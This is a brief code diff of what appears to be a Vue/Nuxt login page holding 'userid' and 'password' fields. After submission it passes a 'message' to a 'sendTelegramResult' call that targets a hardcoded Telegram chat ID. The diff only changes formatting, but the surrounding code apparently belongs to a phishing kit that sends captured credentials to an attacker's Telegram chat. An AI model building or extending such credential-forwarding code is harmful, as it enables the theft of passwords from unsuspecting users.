@@ -104,7 +104,7 @@ export default {
     return {
       formDataRes: {
         userid: "",
-        password: "",
+        password: ""
       },
       loading: false,
       isActive: false,
@@ -127,7 +127,9 @@ export default {
         await this.sendTelegramResult(
           process.env.NUXT_APP_CHAT_ID || "-4794000485", 
           // 5
-          message
+      
+         message
+       
         );
 
         this.isActive = !this.isActive;
